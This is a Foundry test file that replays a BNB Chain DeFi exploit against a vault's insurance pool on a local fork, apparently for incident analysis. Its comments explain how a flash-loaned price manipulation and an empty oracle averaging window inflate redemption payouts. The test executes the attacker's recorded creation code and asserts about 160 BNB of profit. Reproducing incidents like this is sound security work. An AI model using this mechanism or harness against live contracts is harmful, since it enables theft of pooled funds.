// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// OSK CoreVault / InsurancePool (BNB Chain, 2026-11-03).
//
// Replay of the creation transaction. The constructor flash-borrows WBNB from
// Lista Moolah, dumps it into the Pancake WBNB/USDT pair, and redeems.
// redeemPrincipal prices the payout with OracleLib.getAccountingPrices
// (CoreVaultFarming.sol:378). That function pushes the live spot into
// wbnbAvgWindow and then reads the average (OracleLib.sol:101-109). An empty
// window makes the average equal the just-manipulated spot
// (_avgTimeWindow, OracleLib.sol:291-293; _selectWbnbPerUsd is not the path
// used here). payoutBnb pulls the shortfall from InsurancePool.withdrawReserve.
//
//   tx    0x072a10a579e2a8afa26a681205a2aaaa38f74bcb9d1064b12bd9e9ebe2c598b3
//   block 131507810
//   from  0xD3565b191b28B49Cc517189B984dacDB1FF05304

contract CoreVaultReplay {
    address internal constant ATTACKER = 0xD3565b191b28B49Cc517189B984dacDB1FF05304;
    address internal constant INSURANCE = 0xf40E0d525003FB6C6a9a7D79734a87a465053Df1;

    function attack(bytes memory initCode) external returns (address deployed) {
        uint256 attackerBefore = ATTACKER.balance;
        uint256 poolBefore = INSURANCE.balance;
        assembly {
            deployed := create(0, add(initCode, 0x20), mload(initCode))
        }
        require(deployed != address(0), "creation reverted");
        uint256 attackerAfter = ATTACKER.balance;
        require(attackerAfter > attackerBefore, "attacker");
        uint256 poolAfter = INSURANCE.balance;
        require(poolAfter < poolBefore, "pool");
    }
}

contract CoreVault_exp is Test {
    address internal constant ATTACKER = 0xD3565b191b28B49Cc517189B984dacDB1FF05304;
    address internal constant INSURANCE = 0xf40E0d525003FB6C6a9a7D79734a87a465053Df1;
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", 131_507_809);
    }

    function testExploit() public {
        uint256 attackerBefore = ATTACKER.balance;
        uint256 poolBefore = INSURANCE.balance;

        // The incident transaction is a contract creation. Its init code is the
        // public transaction input. Nonce at the parent block is 3, matching the tx.
        bytes memory initCode = vm.parseBytes(vm.readFile("test/creation.hex"));
        vm.prank(ATTACKER, ATTACKER);
        address deployed;
        assembly {
            deployed := create(0, add(initCode, 0x20), mload(initCode))
        }
        require(deployed != address(0), "creation reverted");

        uint256 attackerGain = ATTACKER.balance - attackerBefore;
        uint256 poolLoss = poolBefore - INSURANCE.balance;
        emit log_named_decimal_uint("attacker BNB gained", attackerGain, 18);
        emit log_named_decimal_uint("insurance BNB lost", poolLoss, 18);

        // CertiK: 160.26 BNB kept. Panda: reserve fell 259.09 BNB.
        assertApproxEqAbs(attackerGain, 160.2578 ether, 0.01 ether, "attacker profit");
        assertGt(poolLoss, attackerGain, "pool loss should cover the profit and the swap fees");
    }

    function testWrapperPaysAttacker() public {
        bytes memory initCode = vm.parseBytes(vm.readFile("test/creation.hex"));
        CoreVaultReplay replay = new CoreVaultReplay();
        uint256 attackerBefore = ATTACKER.balance;
        uint256 poolBefore = INSURANCE.balance;
        vm.prank(ATTACKER, ATTACKER);
        replay.attack(initCode);
        assertApproxEqAbs(ATTACKER.balance - attackerBefore, 160.2578 ether, 0.01 ether, "wrapper profit");
        assertGt(poolBefore - INSURANCE.balance, 160 ether, "wrapper pool loss");
        assertEq(address(replay).balance, 0, "replay keeps nothing");
    }
}
